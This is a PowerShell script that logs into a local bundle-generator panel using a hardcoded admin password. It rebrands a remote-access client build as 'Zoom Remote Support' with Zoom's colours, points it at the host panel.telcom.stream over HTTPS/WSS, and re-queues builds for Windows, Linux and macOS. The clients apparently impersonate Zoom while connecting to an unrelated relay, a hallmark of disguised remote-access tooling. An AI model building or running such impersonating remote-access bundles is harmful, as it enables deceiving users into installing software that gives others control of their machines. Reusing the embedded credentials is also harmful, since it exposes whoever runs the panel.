param(
    [string]$Base = 'http://localhost:5000',
    [string]$User = 'admin',
    [string]$Pass = 'tKjsnYB8Mez2FRd1',
    [string]$BundleId = '37fac6a77bcc',
    [string]$ServerHost = 'panel.telcom.stream'
)
# Updates an existing bundle to point at the tunnel host over HTTPS/WSS,
# then re-queues the build for all 6 desktop targets.
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

$sess = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$page = Invoke-WebRequest -Uri "$Base/login" -WebSession $sess -UseBasicParsing -TimeoutSec 20
$csrf = ''
if ($page.Content -match "csrfToken:\s*'([^']+)'") { $csrf = $Matches[1] }
if (-not $csrf -and ($page.Content -match 'name="_csrf"[^>]*value="([^"]+)"')) { $csrf = $Matches[1] }
$h = @{ 'X-CSRF-Token' = $csrf; 'Content-Type' = 'application/json' }
$null = Invoke-WebRequest -Uri "$Base/api/auth/login" -Method Post -Body (@{username=$User;password=$Pass}|ConvertTo-Json -Compress) -Headers $h -WebSession $sess -UseBasicParsing -TimeoutSec 25
Write-Output 'LOGIN ok'

# 1) Ensure terms accepted (required before build)
try {
    $t = Invoke-WebRequest -Uri "$Base/api/generator/module/accept-terms" -Method Post -Body '{}' -Headers $h -WebSession $sess -UseBasicParsing -TimeoutSec 20
    Write-Output ("accept-terms: " + $t.StatusCode)
} catch { Write-Output ("accept-terms: " + $_.Exception.Message) }

# 2) Update the bundle branding to the tunnel host + HTTPS.
#    finalizeSupportBranding (patched) bakes address/api_url on :443 and
#    cdap_url = wss://panel.telcom.stream/cdap automatically.
$platforms = @(
    @{platform='windows';arch='x64';format='portable'},
    @{platform='windows';arch='arm64';format='portable'},
    @{platform='linux';arch='x64';format='portable'},
    @{platform='linux';arch='arm64';format='portable'},
    @{platform='macos';arch='x64';format='portable'},
    @{platform='macos';arch='arm64';format='portable'}
)
$branding = @{
    company_name    = 'Zoom'
    app_name        = 'Zoom'
    product_label   = 'Zoom Remote Support'
    server_host     = $ServerHost
    relay_host      = $ServerHost
    use_https       = $true
    primary_color   = '#2d8cff'
    accent_color    = '#0b5cff'
    background_color= '#ffffff'
    surface_color   = '#f3f4f6'
    text_color      = '#1f2937'
}
$payload = @{ branding = $branding; platforms = $platforms } | ConvertTo-Json -Depth 8 -Compress
try {
    $u = Invoke-WebRequest -Uri "$Base/api/generator/bundles/$BundleId" -Method Put -Body $payload -Headers $h -WebSession $sess -UseBasicParsing -TimeoutSec 60
    Write-Output ("update bundle: HTTP " + $u.StatusCode)
    $uj = $u.Content | ConvertFrom-Json
    $bb = $uj.data.bundle.branding
    Write-Output ("  server_host=" + $bb.server_host + " use_https=" + $bb.use_https)
    Write-Output ("  address=" + $bb.server.address + " api_url=" + $bb.server.api_url + " cdap_url=" + $bb.server.cdap_url)
} catch {
    Write-Output ("update ERR: " + $_.Exception.Message)
    if ($_.ErrorDetails) { Write-Output $_.ErrorDetails.Message }
    exit 1
}

# 3) Re-queue the build (resets failed -> queued, dispatches GitHub Actions).
try {
    $r = Invoke-WebRequest -Uri "$Base/api/generator/bundles/$BundleId/rebuild" -Method Post -Body '{}' -Headers $h -WebSession $sess -UseBasicParsing -TimeoutSec 60
    Write-Output ("rebuild: HTTP " + $r.StatusCode)
    Write-Output $r.Content
} catch {
    Write-Output ("rebuild ERR: " + $_.Exception.Message)
    if ($_.ErrorDetails) { Write-Output $_.ErrorDetails.Message }
}
